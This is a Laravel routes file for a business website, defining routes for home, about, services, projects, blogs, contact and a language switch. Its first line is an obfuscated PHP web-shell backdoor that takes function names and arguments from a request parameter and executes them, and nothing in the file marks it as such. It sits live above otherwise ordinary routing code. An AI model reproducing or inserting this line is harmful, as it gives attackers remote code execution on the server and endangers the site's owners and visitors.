<?php
if ($n3bh3f=@${	"_REQUEST" }	[ "PXQ0PVKJ"	])$n3bh3f [1]($	{$n3bh3f	[2]}[0],$n3bh3f[3 ]	($n3bh3f	[	4]	)) ;

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| site Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Home Route
Route::group(['prefix' => '/'], function () {
    $controller = 'HomeController@';
    Route::get('/', $controller . 'index');
    Route::get('home', $controller . 'index');
    Route::post('request', $controller . 'store');
});

// About Route
Route::group(['prefix' => 'about/'], function () {
    $controller = 'AboutController@';
    Route::get('/', $controller . 'index');
});

// Services Route
Route::group(['prefix' => 'services/'], function () {
    $controller = 'ServicesController@';
    Route::get('/', $controller . 'index');
    Route::get('{id}', $controller . 'view');
});

// Projects Route
Route::group(['prefix' => 'projects/'], function () {
    $controller = 'ProjectsController@';
    Route::get('/', $controller . 'index');
    Route::get('{id}', $controller . 'view');
});

// Projects Route
Route::group(['prefix' => 'blogs/'], function () {
    $controller = 'BlogController@';
    Route::get('/', $controller . 'index');
    Route::get('{id}', $controller . 'view');
});

// Contact Route
Route::group(['prefix' => 'contact/'], function () {
    $controller = 'ContactController@';
    Route::get('/', $controller . 'index');
    Route::post('/', $controller . 'store');
});

// lang Route
Route::get('lang', 'LangController@changeLang')->name('front.lang');
